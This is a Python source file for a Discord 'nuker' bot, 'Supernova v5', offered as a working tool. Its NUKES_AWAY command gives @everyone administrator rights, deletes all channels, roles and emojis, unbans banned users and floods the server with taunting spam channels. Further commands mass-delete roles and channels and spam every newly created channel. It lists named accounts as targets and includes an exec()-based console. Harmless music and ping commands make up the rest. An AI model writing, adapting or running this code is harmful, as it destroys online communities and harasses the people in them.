#imports
print("Loading libaries...")
import discord
from discord.ext import commands, tasks
from colorama import Fore, init
from tkinter import messagebox as msg
from tkinter import simpledialog as sd
import sys
import pickle
#import youtube_dl
import os
import random
from discord import Permissions


#pickle stuff



#varible definitions
print("Defining varibles...")
intents = discord.Intents().all()
ver = "Supernova v5 DEV"
bot = commands.Bot(command_prefix=">")
#token = sd.askstring(ver, "Enter token:")
#BELOW VARIBLE IS FOR DEV ONLY!! UNCOMMENT IF YOU ARE MODIFIYING THIS CODE!
token = "token"
ANTI_NUKES = ["Protection X#1252", "Security#1120", "Wick#3938"]
TARGETS = ["Snipe#1460", "Frauder#0724", "KingofShadows#4639", "sachiko#6354"]
TRUSTED = ["Nothecker#8491", "The_SysKill#1878", "Dragoblade#3001"]
SPAM_CHANNEL = ["""DIE""","Get blown up wth %s" % ver,"opps supernovaed","oops stepped in explosion","I run you","Blown up by Sys","I run you","kinda stepped in tha explosion urself", "Lol"]
SPAM_MESSAGE = ["""```ansi
   [2;45m          [0m       [2;45m  [0m[2;45m  [0m    [2;45m[2;41m[2;45m [0m[2;41m[0m[2;45m[0m         [2;31m|[0m  [2;35mv      v      5555555[0m
[2;45m   [0m                 [2;45m  [0m [2;45m  [0m   [2;45m [0m         [2;31m|[0m   [2;35mv    v       55[0m
 [2;45m   [0m                [2;45m  [0m  [2;45m  [0m  [2;45m [0m         [2;31m|[0m    [2;35mv  v        55555[0m
   [2;45m          [0m       [2;45m  [0m   [2;45m  [0m [2;45m [0m         [2;31m|[0m    [2;35m vv             555[0m
            [2;45m  [0m      [2;45m  [0m    [2;45m  [0m[2;45m [0m         [2;31m|[0m    [2;35m                 555[0m
   [2;45m          [0m       [2;45m  [0m     [2;45m  [0m         [2;31m|[0m[2;35m                5555555[0m
[2;40m[0m
```""","@everyone You Got Blown up with %s" % ver, "CODE Written By Sys, @everyone MUST SUFFER, \n","@everyone MUST LEARN CODING OR ELSE", "Frauder is a fraud, idk why i put this here, probably coz its true.","GG U GOT NUKED"]
SYS_IS_GOD = """```ansi
[2;45m[2;33m[2;40mSYSKILL IS GOD! SYSKILL IS GOD! SYSKILL IS GOD! SYSKILL IS GOD!
                    [2;41m         [0m[2;33m[2;40m    [2;41m  [0m[2;33m[2;40m   [2;41m  [0m[2;33m[2;40m    [2;41m          [0m[2;33m[2;40m         
                  [2;41m  [0m[2;33m[2;40m               [2;41m   [0m[2;33m[2;40m    [2;41m  [0m[2;33m[2;40m                   
[1;33mRESPECT OR ELSE!   [1;41m          [0m[1;33m[1;40m       [1;41m [0m[1;33m[1;40m      [1;41m           [0m[1;33m[1;40m         
                            [1;41m  [0m[1;33m[1;40m      [1;41m [0m[1;33m[1;40m                [1;41m  [0m[1;33m[1;40m        
                   [1;41m          [0m[1;33m[1;40m       [1;41m [0m[1;33m[1;40m      [1;41m           [0m[1;33m[1;40m         
                                                               
                                                               
                                                               
                                                               [1;41m[0m[1;33m[1;40m[0m[2;33m[2;40m[0m[2;33m[2;45m[0m[2;45m[0m
```"""

#DEVELOPER TOOLS

print("Loading developer tools...")
@bot.command(help="Raises a fatal exeption, only trusted can run.")
async def DevCrash(ctx, confirm=None):
    if str(ctx.message.author) in TRUSTED:
        if str(confirm).upper() == "TRUE":
            dead(ctx)
            crash_embed = discord.Embed(title="%s Crashed!" % ver, description=f"Crash manually initiated by {ctx.message.author},\n"
                                                                               f"and {ctx.message.author} was found in trusted list.",
                                        color=0xff000a)
            await ctx.channel.send(embed=crash_embed)
            raise ApplicationError("Manual Crash")
        elif confirm == None:
            emb = discord.Embed(title="Crash", description="Confirm crash?", color=0xff0000)
            emb.add_field(name="Yes", value="Run this command with argument confirm=True.", inline=False)
            emb.add_field(name="No", value="Do not run this command, and nothing will happen.", inline=False)
            await ctx.send(embed=emb)
        else:
            emb = discord.Embed(title="Error", description="Invalid arguments", color=0xf00000)
            await ctx.send(embed=emb)

async def console():
    while 1:
        prompt = input(">>>")
        if prompt == "exit":
            break
        exec(prompt)

@bot.command(help="Opens a developer console on HOST_MACHINE, only trusted can run.")
async def DevCon(ctx):
    if str(ctx.message.author) in TRUSTED:
        await ctx.send("```Console opening...```")
        await console()


print("Loading help command and other extensions...")
#Help command
class MyHelp(commands.HelpCommand):
    def get_command_signature(self, command):
        return '%s%s %s' % (self.clean_prefix, command.qualified_name, command.signature)

    async def send_bot_help(self, mapping):
        embed = discord.Embed(title="Help for Supernova v5")
        for cog, commands in mapping.items():
            filtered = await self.filter_commands(commands, sort=True)
            command_signatures = [self.get_command_signature(c) for c in filtered]
            if command_signatures:
                cog_name = getattr(cog, "qualified_name", "Default Category")
                embed.add_field(name=cog_name, value="\n".join(command_signatures), inline=False)

        channel = self.get_destination()
        await channel.send(embed=embed)

    async def on_help_command_error(self, ctx, error):
        if isinstance(error, commands.BadArgument):
            embed = discord.Embed(title="Error", description=str(error))
            await ctx.send(embed=embed)
        else:
            raise error

    async def send_error_message(self, error):
        embed = discord.Embed(title="Error", description=error)
        channel = self.get_destination()
        await channel.send(embed=embed)

    async def send_command_help(self, command):
        embed = discord.Embed(title=self.get_command_signature(command))
        embed.add_field(name="Help", value=command.help)
        alias = command.aliases
        if alias:
            embed.add_field(name="Aliases", value=", ".join(alias), inline=False)

        channel = self.get_destination()
        await channel.send(embed=embed)

#More class/function definitions
print("Loading other functions...")
class ApplicationError(Exception):
    def __init__(self, message="Unspecified Exeption Details."):
        self.message = message
        super().__init__(self.message)
        exit(1)


#Module init calls
init(convert=True)
client = bot

#bot settings
print("Loading bot settings...")
bot.help_command = MyHelp()

@bot.event
async def on_guild_channel_create(channel):
    try:
        for i in range(random.randint(10,50)):
            try:
                await channel.send(random.choice(SPAM_MESSAGE))
            except AttributeError:
                print("Tried to spam in a VC LMAO")
    except:
        return

@bot.event
async def on_ready():
    await alive("ctx")
    print(f"""
   [2;45m          [0m       [2;45m  [0m[2;45m  [0m    [2;45m[2;41m[2;45m [0m[2;41m[0m[2;45m[0m         [2;31m|[0m  [2;35mv      v      5555555[0m
[2;45m   [0m                 [2;45m  [0m [2;45m  [0m   [2;45m [0m         [2;31m|[0m   [2;35mv    v       55[0m
 [2;45m   [0m                [2;45m  [0m  [2;45m  [0m  [2;45m [0m         [2;31m|[0m    [2;35mv  v        55555[0m
   [2;45m          [0m       [2;45m  [0m   [2;45m  [0m [2;45m [0m         [2;31m|[0m    [2;35m vv             555[0m
            [2;45m  [0m      [2;45m  [0m    [2;45m  [0m[2;45m [0m         [2;31m|[0m    [2;35m                 555[0m
   [2;45m          [0m       [2;45m  [0m     [2;45m  [0m         [2;31m|[0m[2;35m                5555555[0m
[2;40m[0m
{Fore.MAGENTA}Hi! Lets nuke a server together!
My name is {Fore.RED}{ver}!
""")
    await client.change_presence(activity=discord.Game(name=">help"), status=discord.Status.do_not_disturb)


#bot commands
print("Loading bot commands...")
@bot.command()
async def DiE(ctx, stopcode):
    if str(ctx.message.author) in TRUSTED:
        await bot.logout()

@bot.command(help='Tells the bot to join the voice channel')
async def join(ctx):
    if not ctx.message.author.voice:
        emb = discord.Embed(title="Error", description=f"{ctx.message.author.name} is not in a voice channel", color=0xff0000)
        await ctx.send(embed=emb)
        return
    else:
        channel = ctx.message.author.voice.channel
    await channel.connect()
    emb = discord.Embed(title="Joined", description=f"Joined {channel.name} Successfully!", color=0x0fff00)

@bot.command(help='To make the bot leave the voice channel')
async def leave(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_connected():
        await voice_client.disconnect()
    else:
        pass


@bot.command(help='To play song')
async def play(ctx,*, song):
    try:
        if song.upper() == "HACKER":
            filename = "RUN_ITS_A_HACKER.m4a"
            srv = ctx.message.guild
            vc = srv.voice_client
            vc.play(discord.FFmpegPCMAudio(executable="ffmpeg.exe", source=filename))
            await ctx.send("Now playing: **RUN, ITS A HACKER, JUST FREAKING RUN**.m4a")
        elif song.upper() == "FREAK":
            filename = "videoplayback (1).m4a"
            srv = ctx.message.guild
            vc = srv.voice_client
            vc.play(discord.FFmpegPCMAudio(executable="ffmpeg.exe", source=filename))
            await ctx.send("Now playing: **Freaks, 1hr, echo, muffled, slowed**.m4a")
        elif song.upper() == "WINXP":
            filename = "WinXPerr.m4a"
            srv = ctx.message.guild
            vc = srv.voice_client
            vc.play(discord.FFmpegPCMAudio(executable="ffmpeg.exe", source=filename))
            await ctx.send("Now playing: **WinXPerr**.m4a")
        elif song.upper() == "WIN7":
            filename = "Win7err.m4a"
            srv = ctx.message.guild
            vc = srv.voice_client
            vc.play(discord.FFmpegPCMAudio(executable="ffmpeg.exe", source=filename))
            await ctx.send("Now playing: **Win7err**.m4a")
        elif song.upper() == "ERROR LOL":
            filename = "ErrorSystemCrash.m4a"
            srv = ctx.message.guild
            vc = srv.voice_client
            vc.play(discord.FFmpegPCMAudio(executable="ffmpeg.exe", source=filename))
            await ctx.send("Now playing: **Error =)**.m4a")
        elif song.upper() == "WINDOWS":
            filename = "K-391_-_Windows_Non_Copyrighted_Music-yBVUWrwjPoc.webm"
            srv = ctx.message.guild
            vc = srv.voice_client
            vc.play(discord.FFmpegPCMAudio(executable="ffmpeg.exe", source=filename))
            await ctx.send("Now playing **K391 - Windows no copyright**.m4a")
        #server = ctx.message.guild
        #voice_channel = server.voice_client
        #filename = await YTDLSource.from_url(song, loop=bot.loop)
        #voice_channel.play(discord.FFmpegPCMAudio(executable="ffmpeg.exe", source=filename), )
        #await ctx.send('**Now playing:** {}'.format(filename))
        #os.system(f"del \"{filename}\"")
    except:
        erroremb = discord.Embed(title="Error", description="Something broke...", colour=0xff0000)
        raise #Debug


@bot.command(name='pause', help='This command pauses the song')
async def pause(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_playing():
        await voice_client.pause()
    else:
        await ctx.send("The bot is not playing anything at the moment.")


@bot.command(name='resume', help='Resumes the song')
async def resume(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_paused():
        await voice_client.resume()
    else:
        await ctx.send("The bot was not playing anything before this. Use play command")


@bot.command(name='stop', help='Stops the song')
async def stop(ctx):
    voice_client = ctx.message.guild.voice_client
    if voice_client.is_playing():
        await voice_client.stop()
        await leave(ctx=ctx)
    else:
        await ctx.send("The bot is not playing anything at the moment.")

@bot.command(help="U ded ded?", aliases=["d", "die", "ded"])
async def dead(ctx):
    await bot.change_presence(status=discord.Status.offline)

@bot.command(help="U alive alive?", aliases=["rev", "ali", "a"])
async def alive(ctx):
        await bot.change_presence(status=discord.Status.do_not_disturb)


@client.command(help="Now THIS Is the big guns, may fail due to data rate limits. Antinukes are patching...")
async def NUKES_AWAY(ctx):
    print(f"{Fore.YELLOW}NUKE WAS SET OFF BY {ctx.message.author}")
    await ctx.guild.edit(name=f"{ver} RULES!!!")
    await ctx.message.delete()
    guild = ctx.guild
    #for member in ANTI_NUKES:
    #    try:
    #        member = discord.Member(member)
    #        await member.ban()
    #        print(f"{Fore.GREEN}{member.name}#{member.discriminator} Was banned")
    #    except:
    #        print(f"{Fore.RED}{member.name}#{member.discriminator} Was unable to be banned.")
    #for member in TARGETS:
    #    try:
    #        member = discord.Member(member)
    #        await member.ban()
    #        print(f"{Fore.GREEN}{member.name}#{member.discriminator} Was banned.")
    #    except:
    #        print(f"{Fore.RED}{member.name}#{member.discriminator} Was Not Banned")
    try:
        role = discord.utils.get(guild.roles, name = "@everyone")
        await role.edit(permissions = Permissions.all())
        print(f"{Fore.GREEN}I have given everyone admin.")
    except:
        print(f"{Fore.RED}I was unable to give everyone admin")
    link = await ctx.channel.create_invite(max_age=0, max_uses=0)
    print(f"{Fore.YELLOW}New Invite: {link}")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{Fore.GREEN}{channel.name} was deleted.")
        except:
            print(f"{Fore.RED}{channel.name} was NOT deleted.")
            continue
    for role in guild.roles:
        try:
            await role.edit(permissions = Permissions.all())
            print(f"{Fore.GREEN}{role.name} Has been given full perms")
        except:
            print(f"{Fore.RED}{role.name} Has not been given full perms")
            continue
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(f"{Fore.GREEN}{emoji.name} Was deleted")
        except:
            print(f"{Fore.RED}{emoji.name} Wasn't Deleted")
            continue
    banned_users = await guild.bans()
    for ban_entry in banned_users:
        user = ban_entry.user
        try:
            await user.unban(user)
            print(f"{Fore.GREEN}{user.name}#{user.discriminator} Was successfully unbanned.")
        except:
            print(f"{Fore.RED}{user.name}#{user.discriminator} Was not unbanned.")
            continue
    await guild.create_text_channel("blown up by %s" % ver)
    await guild.create_voice_channel("Music if anyone wants some.")


    for i in range(50):
        await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"{Fore.GREEN}Blown up {guild.name} with {Fore.MAGENTA}{ver}{Fore.GREEN} Successfully.")

@client.command(help="Pings the Bot, Is also logged in console.")
async def ping(ctx):
    print(f"{Fore.YELLOW}Bot was pinged by {ctx.message.author}.")
    await ctx.send(f"""Hello! How are you? You are using {ver}.
    The bot is open-source on my discord server:
    https://discord.gg/dKjAAfsGcF
    Have fun using the bot 😉😉😉
    Also, make sure to explore!""")
    print(f"{Fore.GREEN}Ping-Back Success.")


@bot.command(help="Spam is fun")
async def fun(ctx, *,spamstuff=None):
    if spamstuff is None:
        response = discord.Embed(title="Error", description="Wopps, you didnt specify what fun you want!", color=0xff0033)
        await ctx.send(embed=response)
    else:
        await ctx.send(" "+spamstuff*30)

@client.command(help="Banner Hammer")
async def ban(ctx, member : discord.Member, *, reason = "Outta here nerd, Banned by %s" % ver):
        try:
            await member.ban(reason=reason)
            emb = discord.Embed(title="Ban", description=f"{member.name} was banned for {reason}!", color=0xf00000)
            await ctx.send(embed=emb)
        except:
            emb = discord.Embed(title="Ban", description=f"{member} slipped under the ban hammer.", color=0xff000f)
            emb.add_field(name="Why?", value="It could be anything, from bad code, to permission errors.", inline=False)
            emb.add_field(name="No, but seriously,", value="Check my perms and rank hierarchy.", inline=False)
            await ctx.send(embed=emb)


@ban.error
async def error(ctx, error): # This might need to be (error, ctx), I'm not sure
    if isinstance(error, discord.ext.commands.MemberNotFound):
        await ctx.send(embed=discord.Embed(title="Ban", description="I could not find that user.", color=0xff000f))

@bot.command(help="Does what it says on the tin")
async def del_roles(ctx):
    guild = ctx.guild
    for role in guild.roles:
        try:
            await role.delete()
            await ctx.send(f"{role.name} was deleted :D:D:D")
        except:
            await ctx.send(f"{role.name} was not deleted :angry:")

@bot.command(help="Removes all the channels")
async def nuke_channels(ctx):
    guild = ctx.guild
    for channel in guild.text_channels:
        await channel.delete()
    await guild.create_text_channel("New channel")
    await guild.create_voice_channel("Musikaja")


print("Logging in...")
#Login
try:
    bot.run(token)
except:  #Error handling
    line = 382
    print("Fatal error on line 0x%x" % line)
    msg.showerror(ver, "Critical error while parsing line 0x%x,\n"
                                  "The application cannot continue.\n"
                                  "This error could be caused by invalid token or"
                                  "Rate limits. If you manually crashed the application, then this error is normal.\n"
                                  "Press OK to terminate the application.\n"
                                  "Run the application in CMD to get stacktrace error." % line)
    raise SystemError("The Application cannot continue.")



